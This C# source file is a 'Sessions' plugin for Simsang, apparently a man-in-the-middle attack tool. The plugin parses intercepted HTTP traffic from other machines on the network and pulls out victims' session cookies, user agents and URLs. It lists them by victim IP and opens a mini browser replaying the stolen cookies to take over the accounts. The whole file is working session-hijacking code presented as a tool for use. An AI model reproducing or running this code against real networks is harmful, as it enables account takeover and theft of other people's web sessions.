using System;
using System.IO;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Configuration;
using System.Xml;
using System.Xml.Linq;
using System.Xml.Serialization;
using System.Reflection;

using Simsang.Plugin;
using Simsang.MiniBrowser;
using Plugin.Main.Session;
using Plugin.Main.Session.Config;
using MngSessions = Plugin.Main.Session.ManageSessions;
using MngSessionsConfig = Plugin.Main.Session.ManageSessions.Config;


namespace Plugin.Main
{
  public partial class PluginSessionsUC : UserControl, IPlugin, IObserver
  {

    #region MEMBERS

    private String cIconsDir = @"\Icons";
    private List<String> cTargetList;
    private BindingList<Session.Config.Session> cSessions;
    public List<MngSessionsConfig.SessionPattern> cSessionPatterns;
    private List<String> cDataBatch;
    private TaskFacade cTask;
    private PluginParameters cPluginParams;
    private TreeNode mFilterNode;

    #endregion


    #region PUBLIC

    /// <summary>
    /// 
    /// </summary>
    public PluginSessionsUC(PluginParameters pPluginParams)
    {
      InitializeComponent();

      TV_Sessions.ExpandAll();


      #region DATAGRID HEADER

      DGV_Sessions.AutoGenerateColumns = false;

      DataGridViewTextBoxColumn cSrcMAC = new DataGridViewTextBoxColumn();
      cSrcMAC.DataPropertyName = "SrcMAC";
      cSrcMAC.Name = "SrcMAC";
      cSrcMAC.HeaderText = "Source MAC";
      cSrcMAC.Width = 125;
      DGV_Sessions.Columns.Add(cSrcMAC);


      DataGridViewTextBoxColumn cSrcIPCol = new DataGridViewTextBoxColumn();
      cSrcIPCol.DataPropertyName = "SrcIP";
      cSrcIPCol.Name = "SrcIP";
      cSrcIPCol.HeaderText = "Source IP";
      cSrcIPCol.Width = 120;
      //            cSrcIPCol.Visible = false;
      DGV_Sessions.Columns.Add(cSrcIPCol);


      DataGridViewTextBoxColumn cServiceURLCol = new DataGridViewTextBoxColumn();
      cServiceURLCol.DataPropertyName = "URL";
      cServiceURLCol.Name = "URL";
      cServiceURLCol.HeaderText = "URL";
      cServiceURLCol.ReadOnly = true;
      cServiceURLCol.Resizable = System.Windows.Forms.DataGridViewTriState.False;
      //            cServiceURLCol.Width = 180;
      cServiceURLCol.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
      DGV_Sessions.Columns.Add(cServiceURLCol);


      DataGridViewTextBoxColumn cDestPortCol = new DataGridViewTextBoxColumn();
      cDestPortCol.DataPropertyName = "DstPort";
      cDestPortCol.Name = "DstPort";
      cDestPortCol.HeaderText = "Service";
      cDestPortCol.Visible = false;
      cDestPortCol.ReadOnly = true;
      DGV_Sessions.Columns.Add(cDestPortCol);


      DataGridViewTextBoxColumn cCookiesCol = new DataGridViewTextBoxColumn();
      cCookiesCol.DataPropertyName = "SessionCookies";
      cCookiesCol.Name = "SessionCookies";
      cCookiesCol.HeaderText = "Cookies";
      cCookiesCol.Visible = false;
      DGV_Sessions.Columns.Add(cCookiesCol);


      DataGridViewTextBoxColumn cBrowserCol = new DataGridViewTextBoxColumn();
      cBrowserCol.DataPropertyName = "Browser";
      cBrowserCol.Name = "Browser";
      cBrowserCol.HeaderText = "Browser";
      cBrowserCol.Visible = false;
      cBrowserCol.Width = 120;
      DGV_Sessions.Columns.Add(cBrowserCol);



      DataGridViewTextBoxColumn cGroupCol = new DataGridViewTextBoxColumn();
      cGroupCol.DataPropertyName = "Group";
      cGroupCol.Name = "Group";
      cGroupCol.HeaderText = "Group";
      cGroupCol.Visible = false;
      cGroupCol.Width = 0;
      DGV_Sessions.Columns.Add(cGroupCol);

      cSessions = new BindingList<Session.Config.Session>();
      DGV_Sessions.DataSource = cSessions;
      #endregion


      /*
       * Plugin configuration
       */
      cPluginParams = pPluginParams;
      String lBaseDir = String.Format(@"{0}\", (pPluginParams != null) ? pPluginParams.PluginDirectoryFullPath : Directory.GetCurrentDirectory());
      String lSessionDir = (pPluginParams != null) ? pPluginParams.SessionDirectoryFullPath : String.Format("{0}sessions", lBaseDir);

      Config = new PluginProperties()
      {
        BaseDir = lBaseDir,
        SessionDir = lSessionDir,
        PluginName = "Sessions",
        PluginDescription = "Listing and taking over session where valid session cookies where found within HTTP requests.",
        PluginVersion = "0.8",
        Ports = "TCP:80;TCP:443;",
        IsActive = true
      };
      cDataBatch = new List<String>();

      // Make it double buffered.
      typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.SetProperty, null, DGV_Sessions, new object[] { true });
      T_GUIUpdate.Start();

      cSessionPatterns = new List<MngSessionsConfig.SessionPattern>();
      TV_Sessions.DoubleClick += TreeView_DoubleClick;

      cTask = TaskFacade.getInstance(this);
      DomainFacade.getInstance(this).addObserver(this);
    }

    #endregion


    #region PROPERTIES

    public Control PluginControl { get { return (this); } }
    public IPluginHost PluginHost { get { return cPluginParams.HostApplication; } }

    #endregion


    #region IPlugin Member

    /// <summary>
    /// 
    /// </summary>
    public PluginProperties Config { set; get; }


    /// <summary>
    /// 
    /// </summary>
    public delegate void onInitDelegate();
    public void onInit()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onInitDelegate(onInit), new object[] { });
        return;
      } // if (InvokeRequired)


      cPluginParams.HostApplication.Register(this);
      cPluginParams.HostApplication.PluginSetStatus(this, "grey");

      try
      {
        initSessionPatterns();
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0} : Error ocurred while initialising pattern file : {1}", Config.PluginName, lEx.Message));
      }
    }



    /// <summary>
    /// 
    /// </summary>
    public delegate void onStartAttackDelegate();
    public void onStartAttack()
    {
      if (Config.IsActive)
      {
        if (InvokeRequired)
        {
          BeginInvoke(new onStartAttackDelegate(onStartAttack), new object[] { });
          return;
        } // if (InvokeRequired)

        cPluginParams.HostApplication.PluginSetStatus(this, "green");
      } // if (cIsActi...
    }


    /// <summary>
    /// 
    /// </summary>
    public delegate void onStopAttackDelegate();
    public void onStopAttack()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onStopAttackDelegate(onStopAttack), new object[] { });
        return;
      } // if (InvokeRequired)

      cPluginParams.HostApplication.PluginSetStatus(this, "grey");
    }


    /// <summary>
    /// 
    /// </summary>
    /// <returns></returns>
    public delegate String getDataDelegate();
    public String getData()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new getDataDelegate(getData), new object[] { });
        return ("");
      } // if (InvokeRequired)

      return ("");
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="pSessionID"></param>
    /// <returns></returns>
    public delegate String onGetSessionDataDelegate(String pSessionID);
    public String onGetSessionData(String pSessionID)
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onGetSessionDataDelegate(onGetSessionData), new object[] { pSessionID });
        return (String.Empty);
      } // if (InvokeRequired)

      String lRetVal = String.Empty;

      try
      {
        lRetVal = cTask.getSessionData(pSessionID);
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
      }

      return (lRetVal);
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="pSessionName"></param>
    public delegate void onLoadSessionDataFromFileDelegate(String pSessionName);
    public void onLoadSessionDataFromFile(String pSessionName)
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onLoadSessionDataFromFileDelegate(onLoadSessionDataFromFile), new object[] { pSessionName });
        return;
      } // if (InvokeRequired)

      try
      {
        onResetPlugin();
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
      }

      try
      {
        cTask.loadSessionData(pSessionName);
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message)); 
      }
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="pSessionData"></param>
    public delegate void onLoadSessionDataFromStringDelegate(String pSessionData);
    public void onLoadSessionDataFromString(String pSessionData)
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onLoadSessionDataFromStringDelegate(onLoadSessionDataFromString), new object[] { pSessionData });
        return;
      } // if (InvokeRequired)

      cTask.loadSessionDataFromString(pSessionData);
    }


    /// <summary>
    /// Serialize session data
    /// </summary>
    /// <param name="pSessionName"></param>
    public delegate void onSaveSessionDataDelegate(String pSessionName);
    public void onSaveSessionData(String pSessionName)
    {
      if (Config.IsActive)
      {
        if (InvokeRequired)
        {
          BeginInvoke(new onSaveSessionDataDelegate(onSaveSessionData), new object[] { pSessionName });
          return;
        } // if (InvokeRequired)

        cTask.saveSession(pSessionName);
      } // if (cIsActiv...
    }


    /// <summary>
    /// 
    /// </summary>
    public delegate void onShutDownDelegate();
    public void onShutDown()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onShutDownDelegate(onShutDown), new object[] { });
        return;
      } // if (Invoke
    }


    /// <summary>
    /// Remove session file with serialized data.
    /// </summary>
    /// <param name="pSessionName"></param>
    public delegate void onDeleteSessionDataDelegate(String pSessionName);
    public void onDeleteSessionData(String pSessionName)
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onDeleteSessionDataDelegate(onDeleteSessionData), new object[] { pSessionName });
        return;
      } // if (InvokeRequired)

      cTask.deleteSession(pSessionName);
    }





    /// <summary>
    /// 
    /// </summary>
    public delegate void onResetPluginDelegate();
    public void onResetPlugin()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onResetPluginDelegate(onResetPlugin), new object[] { });
        return;
      } // if (InvokeRequired)


      cPluginParams.HostApplication.PluginSetStatus(this, "grey");
      /*
       * Clear DataGridView
       */
      //if (cSessions != null)
      //  cSessions.Clear();

      //DGV_Sessions.DataSource = cSessions;
      //DGV_Sessions.Refresh();

      /*
       * Clear TreeView
       */
      try
      {
        if (TV_Sessions != null && TV_Sessions.Nodes.Count > 0)
          foreach (TreeNode lNode in TV_Sessions.Nodes)
            foreach (TreeNode lSubNode in lNode.Nodes)
              if (lSubNode != null && lSubNode.Nodes.Count > 0)
                lSubNode.Nodes.Clear();

      }
      catch (Exception) { }

      /*
       * Select Main TV-Node.
       */
      mFilterNode = TV_Sessions.Nodes[0];
      TV_Sessions.SelectedNode = TV_Sessions.Nodes[0];
      TV_Sessions.Select();
      //            myTreeView.SelectedNode = myTreeNode

    }


    /// <summary>
    /// New input data arrived
    /// TCP||00:11:22:33:44:55||192.168.0.123||51984||74.125.79.136||80||GET...
    /// </summary>
    /// <param name="pData"></param>
    public delegate void onNewDataDelegate(String pData);
    public void onNewData(String pData)
    {
      if (Config.IsActive)
      {
        if (InvokeRequired)
        {
          BeginInvoke(new onNewDataDelegate(onNewData), new object[] { pData });
          return;
        } // if (InvokeRequired)

        lock (this)
        {
          if (cDataBatch != null && pData != null && pData.Length > 0)
            cDataBatch.Add(pData);
        } // lock (this)
      } // if (cIsActiv...
    }



    /// <summary>
    /// 
    /// </summary>
    /// <param name="pTargetList"></param>
    public void SetTargets(List<String> pTargetList)
    {
      cTargetList = pTargetList;
    }


    #endregion


    #region PRIVATE
    /// <summary>
    /// 
    /// </summary>
    public void ProcessEntries()
    {
      if (cDataBatch != null && cDataBatch.Count > 0)
      {
        List<Session.Config.Session> lNewRecords = new List<Session.Config.Session>();
        List<String> lNewData;

        lock (this)
        {
          lNewData = new List<String>(cDataBatch);
          cDataBatch.Clear();
        } // lock (this)...


        foreach (String lEntry in lNewData)
        {
          try
          {
            if (!String.IsNullOrEmpty(lEntry))
            {
              String[] lSplitter = Regex.Split(lEntry, @"\|\|");
              if (lSplitter.Length == 7)
              {
                String lProto = lSplitter[0];
                String lSMAC = lSplitter[1];
                String lSIP = lSplitter[2];
                String lSPort = lSplitter[3];
                String lDIP = lSplitter[4];
                String lDPort = lSplitter[5];
                String lData = lSplitter[6];


                foreach (MngSessionsConfig.SessionPattern lTmp in cSessionPatterns)
                {
                  String lHost = String.Format(@"\.\.Host\s*:\s*{0}\.\.", lTmp.HTTPHost);
                  if (Regex.Match(lData, @lHost, RegexOptions.IgnoreCase).Success &&
                      Regex.Match(lData, @lTmp.SessionPatternString, RegexOptions.IgnoreCase).Success)
                  {
                    lock (this)
                    {
                      EvaluateSession(lData, lSMAC, lSIP, lTmp.Webpage, lTmp.SessionName.ToLower());
                    }
                    break;
                  } // if (Rege...
                } // foreach (Sessio...
              } // if (lSplitt...
            } // if (pData.L..
          }
          catch (Exception lEx)
          {
            MessageBox.Show(String.Format("{0} : {1}", Config.PluginName, lEx.Message));
          }
        } // foreach (...
      } // if (cBatch...
    }


    /// <summary>
    /// 
    /// </summary>
    private void initSessionPatterns()
    {
      cSessionPatterns = cTask.readSessionPatterns();

      /*
       * Clear and repopulate ImageList
       */
      IL_Sessions.Images.Clear();
      String lImgDir = String.Format("{0}{1}", Config.BaseDir, cIconsDir);
      String[] lFileEntries = Directory.GetFiles(lImgDir);

      foreach (String lFileName in lFileEntries)
      {
        Image lIcon = Image.FromFile(lFileName);
        FileInfo lFileInfo = new FileInfo(lFileName);
        String lIconKey = Path.GetFileNameWithoutExtension(lFileInfo.Name).ToLower();

        IL_Sessions.Images.Add(lIconKey, lIcon);
      }

      /*
       * Clear and repopulate Treeview.
       */
      try
      {
        if (TV_Sessions != null && TV_Sessions.Nodes.Count > 0)
          foreach (TreeNode lNode in TV_Sessions.Nodes)
            lNode.Nodes.Clear();
      }
      catch (Exception) { }

      mFilterNode = TV_Sessions.Nodes[0];
      foreach (MngSessionsConfig.SessionPattern lTmp in cSessionPatterns)
      {
        TreeNode lChildNode = new TreeNode(lTmp.SessionName);
        String lSessionName = lTmp.SessionName.ToLower();

        lChildNode.ImageIndex = IL_Sessions.Images.IndexOfKey(lSessionName);
        lChildNode.SelectedImageIndex = IL_Sessions.Images.IndexOfKey(lSessionName);
        mFilterNode.Nodes.Add(lChildNode);
      } // foreach (...


      /*
       * Set root node properties
       */
      TV_Sessions.Nodes[0].ImageKey = "default";
      TV_Sessions.Nodes[0].SelectedImageKey = "default";
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="pData"></param>
    /// <param name="pSrcMAC"></param>
    /// <param name="pSrcIP"></param>
    /// <param name="pURL"></param>
    /// <param name="pSessionName"></param>
    /// <returns></returns>
    private bool EvaluateSession(String pData, String pSrcMAC, String pSrcIP, String pURL, String pSessionName)
    {
      bool lRetVal = false;
      String lCookies = String.Empty;
      String lBrowser = String.Empty;
      String lHost = String.Empty;
      String lURI = String.Empty;
      Match lMatchCookies;
      Match lMatchBrowser;
      Match lMatchURI;
      Match lMatchHost;


      if (((lMatchBrowser = Regex.Match(pData, @"\.\.User-Agent\s*:\s*(.*?)(\.\.|$)", RegexOptions.IgnoreCase))).Success &&
          ((lMatchCookies = Regex.Match(pData, @"\.\.Cookie\s*:\s*(.*?)(\.\.|$)", RegexOptions.IgnoreCase))).Success &&
          ((lMatchHost = Regex.Match(pData, @"\.\.Host\s*:\s*(.*?)(\.\.|$)", RegexOptions.IgnoreCase))).Success &&
          ((lMatchURI = Regex.Match(pData, @"GET\s+([^\s]+)\s+", RegexOptions.IgnoreCase))).Success)
      {

        /*
         * Define connection data.
         */
        lCookies = lMatchCookies.Groups[1].Value.ToString();
        lBrowser = lMatchBrowser.Groups[1].Value.ToString();

        if (pURL.Length > 0)
          lHost = pURL;
        else
        {
          lURI = lMatchURI.Groups[1].Value.ToString();
          lHost = "http://" + lMatchHost.Groups[1].Value.ToString() + lURI;
        }


        if (lCookies.Length > 0 && lBrowser.Length > 0 && lHost.Length > 0)
        {
          if (IsInDGV(pSrcIP, lBrowser, lCookies) == false)
          {
            //  int lLastPosition = DGV_Sessions.FirstDisplayedScrollingRowIndex;
            AddNode(pSessionName, pSrcIP, IL_Sessions.Images.IndexOfKey(pSessionName));

            //  cSessions.Add(new Session.Config.Session(pSrcMAC, pSrcIP, lHost, "80", lCookies, lBrowser, pSessionName));
            cTask.addRecord(new Session.Config.Session(pSrcMAC, pSrcIP, lHost, "80", lCookies, lBrowser, pSessionName));
            //  DGVFilter();  // Respect the set filter rule!
            ////  DGV_Sessions.Refresh();

            //  if (lLastPosition >= 0)
            //    DGV_Sessions.FirstDisplayedScrollingRowIndex = lLastPosition;
          }
        } // if (lCookies.L...
      } // if (((lMatc...


      return (lRetVal);
    }



    /// <summary>
    /// 
    /// </summary>
    /// <param name="pTreeNode"></param>
    /// <param name="pEntry"></param>
    /// <returns></returns>
    private bool NodeExists(TreeNode pTreeNode, String pEntry)
    {
      bool lRetVal = false;
      foreach (TreeNode lNode in pTreeNode.Nodes)
      {
        if (lNode.Text == pEntry)
        {
          lRetVal = true;
          break;
        }
      }

      return (lRetVal);
    }


    /// <summary>
    /// Add new victim node
    /// </summary>
    /// <param name="pParentName"></param>
    /// <param name="pSrcIP"></param>
    /// <param name="pImgIndex"></param>
    /// <returns></returns>
    private bool AddNode(String pParentName, String pSrcIP, int pImgIndex)
    {
      bool lRetVal = false;
      TreeNode lParentNode;
      TreeNode lTempNode;


      try
      {
        if (TV_Sessions.Nodes.Count > 0 && TV_Sessions.Nodes[0].Nodes.Count > 0 && (lParentNode = getNodeByName(pParentName)) != null)
        {
          if (NodeExists(lParentNode, pSrcIP) == false)
          {
            lTempNode = lParentNode.Nodes.Add(pSrcIP);
            lTempNode.ImageIndex = pImgIndex;
            lTempNode.SelectedImageIndex = pImgIndex;
            lParentNode.ExpandAll();
            lRetVal = true;
          } // if (nodeExist...
        } // if ((lFBNode = TV_Se...
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
      }

      return (lRetVal);
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="pNodeName"></param>
    /// <returns></returns>
    private TreeNode getNodeByName(String pNodeName)
    {
      TreeNode lRetVal = null;

      if (!String.IsNullOrEmpty(pNodeName))
      {
        foreach (TreeNode lTmp in TV_Sessions.Nodes[0].Nodes)
        {
          if (lTmp.Text.ToLower().Contains(pNodeName.ToLower()))
          {
            lRetVal = lTmp;
            break;
          } // if (lTmp.Tex...
        } // foreach (Tree...
      } // if (Strin...


      return (lRetVal);
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="pIP"></param>
    /// <param name="pBrowser"></param>
    /// <param name="pCookie"></param>
    /// <returns></returns>
    private bool IsInDGV(String pIP, String pBrowser, String pCookie)
    {
      bool lRetVal = false;
      Session.Config.Session lSess;
      IEnumerator lEnumList = cSessions.GetEnumerator();

      lEnumList.Reset();
      while (lEnumList.MoveNext())
      {
        if ((lSess = (Session.Config.Session)lEnumList.Current) != null)
        {
          if (lSess.SrcIP == pIP &&
            //                        lSess.Browser == pBrowser &&
              lSess.SessionCookies == pCookie)
          {
            lRetVal = true;
            break;
          } // if (lSess.Sr...
        } // if ((lSess...
      } // while (lEnumLi...

      return (lRetVal);
    }



    /// <summary>
    /// 
    /// </summary>
    private void DGVFilter()
    {
      try
      {
        // Filter by IP
        if (Regex.Match(mFilterNode.Text, @"^\d+\.\d+\.\d+\.\d+$").Success)
          FilterByIP(mFilterNode.Text);
        // Remove all filters -> "Sessions" was clicked
        else if (Regex.Match(mFilterNode.Text, "sessions", RegexOptions.IgnoreCase).Success)
          DisableFilter();
        // Filter by group
        else if (mFilterNode.Text.Length > 0)
          FilterByGroup(mFilterNode.Text);
        else
          DisableFilter();

      }
      catch (Exception) { }

      DGV_Sessions.Refresh();
    }


    /// <summary>
    /// Set filter by IP
    /// </summary>
    /// <param name="pIPAddress"></param>
    private void FilterByIP(String pIPAddress)
    {
      CurrencyManager cm = (CurrencyManager)BindingContext[DGV_Sessions.DataSource];
      cm.SuspendBinding();

      foreach (DataGridViewRow lRow in DGV_Sessions.Rows)
      {
        if (lRow.Cells[1].Value.ToString() == pIPAddress)
          lRow.Visible = true;
        else
          lRow.Visible = false;
      } // foreach (DataG...

      cm.ResumeBinding();
    }


    /// <summary>
    /// Set filter by Group
    /// </summary>
    /// <param name="pGroup"></param>
    private void FilterByGroup(String pGroup)
    {
      CurrencyManager cm = (CurrencyManager)BindingContext[DGV_Sessions.DataSource];
      cm.SuspendBinding();

      foreach (DataGridViewRow lRow in DGV_Sessions.Rows)
      {
        if (Regex.Match(lRow.Cells[6].Value.ToString().ToLower(), pGroup, RegexOptions.IgnoreCase).Success)
          lRow.Visible = true;
        else
          lRow.Visible = false;
      } // foreach (DataG...
      cm.ResumeBinding();
    }



    /// <summary>
    /// Disable all filters
    /// </summary>
    private void DisableFilter()
    {
      CurrencyManager cm = (CurrencyManager)BindingContext[DGV_Sessions.DataSource];
      cm.SuspendBinding();

      foreach (DataGridViewRow lRow in DGV_Sessions.Rows)
        lRow.Visible = true;

      cm.ResumeBinding();
    }

    #endregion


    #region EVENTS

    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void T_GUIUpdate_Tick(object sender, EventArgs e)
    {
      ProcessEntries();
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void TreeView_DoubleClick(object sender, EventArgs e)
    {
      try
      {
        if (TV_Sessions.SelectedNode.Text.ToLower().Contains("sessions"))
        {
          MngSessions.ManageSessions lManageSessions = new MngSessions.ManageSessions(this);
          lManageSessions.ShowDialog();
          initSessionPatterns();
        }
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));     
      }
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void TV_Sessions_AfterCollapse(object sender, TreeViewEventArgs e)
    {
      TV_Sessions.ExpandAll();
    }



    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void TV_Sessions_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
    {
      // This wont work :  mFilterNode = TV_Sessions.SelectedNode;
      mFilterNode = TV_Sessions.GetNodeAt(e.X, e.Y);
      DGVFilter();
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void DGV_Sessions_DoubleClick(object sender, EventArgs e)
    {
      String lURL = String.Empty;
      String lCookies = String.Empty;
      String lSrcIP = String.Empty;
      String lUserAgent = String.Empty;

      if (DGV_Sessions.SelectedRows.Count > 0)
      {
        try
        {
          lURL = DGV_Sessions.SelectedRows[0].Cells["URL"].Value.ToString();
          lCookies = DGV_Sessions.SelectedRows[0].Cells["SessionCookies"].Value.ToString();
          lSrcIP = DGV_Sessions.SelectedRows[0].Cells[1].Value.ToString();
          lUserAgent = DGV_Sessions.SelectedRows[0].Cells["Browser"].Value.ToString();

          Browser lMiniBrowser = new Browser(lURL, lCookies, lSrcIP, lUserAgent);
          lMiniBrowser.Show();
        }
        catch (Exception lEx)
        {
          cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));     
        }
      } // if (DG...
    }



    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void TSMI_Clear_Click(object sender, EventArgs e)
    {
      /*
       * Clear DataGridView
       */
      if (cSessions != null)
        cSessions.Clear();

      DGV_Sessions.DataSource = cSessions;
      DGV_Sessions.Refresh();

      /*
       * Clear TreeView
       */
      try
      {
        if (TV_Sessions != null && TV_Sessions.Nodes.Count > 0)
          foreach (TreeNode lNode in TV_Sessions.Nodes)
            foreach (TreeNode lSubNode in lNode.Nodes)
              if (lSubNode != null && lSubNode.Nodes.Count > 0)
                lSubNode.Nodes.Clear();
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));     
      }

      /*
       * Select Main TV-Node.
       */
      mFilterNode = TV_Sessions.Nodes[0];
      TV_Sessions.SelectedNode = TV_Sessions.Nodes[0];
      TV_Sessions.Select();
      //myTreeView.SelectedNode = myTreeNode
    }



    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void DGV_Sessions_MouseUp(object sender, MouseEventArgs e)
    {
      if (e.Button == MouseButtons.Right)
      {
        try
        {
          DataGridView.HitTestInfo hti = DGV_Sessions.HitTest(e.X, e.Y);
          if (hti.RowIndex >= 0)
            CMS_Sessions.Show(DGV_Sessions, e.Location);
        }
        catch (Exception lEx)
        {
          cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));     
        }
      }
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void TSMI_ShowData_Click(object sender, EventArgs e)
    {
      Main_Notes lSessionNotes = new Main_Notes();
      String lDataLine = String.Empty;

      foreach (Session.Config.Session lSession in cSessions)
      {
        //lDataLine = String.Format("System\t{0} - {1}\r\n\bWebsite\t{2}\r\nCookies\t{3}\r\n\r\n", lSession.SrcMAC, lSession.SrcIP, lSession.Service, lSession.SessionCookies);
        lDataLine = "\nSystem\t" + lSession.SrcMAC + " - " + lSession.SrcIP + "\nWebsite\t" + lSession.URL + "\nCookies\t" + lSession.SessionCookies + "\n";
        lSessionNotes.appendText(lDataLine);
      } // foreach (Sessio...

      lSessionNotes.Show(); // Dialog();
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void deleteEntryToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        BindingList<Session.Config.Session> lTmpHosts = new BindingList<Session.Config.Session>();
        int lCurIndex = DGV_Sessions.CurrentCell.RowIndex;
        String lHostName = DGV_Sessions.Rows[lCurIndex].Cells[1].Value.ToString();


        cSessions.RemoveAt(lCurIndex);

        DGV_Sessions.DataSource = cSessions;
        DGV_Sessions.Refresh();

      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));     
      }
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void DGV_Sessions_MouseDown(object sender, MouseEventArgs e)
    {
      try
      {
        DataGridView.HitTestInfo hti = DGV_Sessions.HitTest(e.X, e.Y);

        if (hti.RowIndex >= 0)
        {
          DGV_Sessions.ClearSelection();
          DGV_Sessions.Rows[hti.RowIndex].Selected = true;
          DGV_Sessions.CurrentCell = DGV_Sessions.Rows[hti.RowIndex].Cells[0];
        }
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));     
        DGV_Sessions.ClearSelection();
      }
    }

    #endregion


    #region OBSERVER INTERFACE METHODS

    public void update(List<Session.Config.Session> pRecordList)
    {
      bool lIsLastLine = false;
      int lLastPosition = -1;
      int lLastRowIndex = -1;
      int lSelectedIndex = -1;

      lock (this)
      {
        /*
         * Remember DGV positions
         */
        if (DGV_Sessions.CurrentRow != null && DGV_Sessions.CurrentRow == DGV_Sessions.Rows[DGV_Sessions.Rows.Count - 1])
          lIsLastLine = true;

        lLastPosition = DGV_Sessions.FirstDisplayedScrollingRowIndex;
        lLastRowIndex = DGV_Sessions.Rows.Count - 1;

        if (DGV_Sessions.CurrentCell != null)
          lSelectedIndex = DGV_Sessions.CurrentCell.RowIndex;


        cSessions.Clear();
        foreach (Session.Config.Session lTmp in pRecordList)
          cSessions.Add(lTmp);

        DGVFilter();

        // Selected cell/row
        try
        {
          if (lSelectedIndex >= 0)
            DGV_Sessions.CurrentCell = DGV_Sessions.Rows[lSelectedIndex].Cells[0];
        }
        catch (Exception) { }


        // Reset position
        try
        {
          if (lLastPosition >= 0)
            DGV_Sessions.FirstDisplayedScrollingRowIndex = lLastPosition;
        }
        catch (Exception) { }

        DGV_Sessions.Refresh();
      } // lock (th...
    }

    #endregion

  }
}
